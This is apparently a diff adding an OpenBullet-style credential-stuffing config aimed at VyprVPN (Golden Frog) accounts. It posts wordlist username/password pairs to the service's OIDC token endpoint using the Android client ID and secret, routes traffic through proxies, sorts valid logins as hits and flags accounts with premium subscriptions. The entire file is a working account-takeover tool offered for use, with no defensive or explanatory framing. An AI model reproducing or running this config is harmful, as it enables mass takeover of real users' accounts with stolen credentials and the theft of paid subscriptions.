@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Vyprvpn_api_adt💔",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-23T16:48:28.2736443+00:00",
+  "AdditionalInfo": "Android_api",
+  "RequiredPlugins": [],
+  "Author": "a1dt0",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_in REQUEST POST "https://api.goldenfrog.com/platform-gf/oidc/token" 
+  CONTENT "client_id=ph-mobile&client_secret=ph-mobile-secret&grant_type=password&username=<USER>&password=<PASS>&scope=openid%20profile%20groups%20tenant" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 4.5.1.113836" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 9" 
+  HEADER "locale: en_GB" 
+  HEADER "Connection: close" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 164" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/3.14.7" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "id_token" 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+
+#subscription REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 4.5.1.113836" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 9" 
+  HEADER "locale: en_GB" 
+  HEADER "Connection: close" 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/3.14.7" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "confirmed\": true" 
+
+#subscription FUNCTION Constant "True" -> CAP "Vyprvpn Premium" 
+
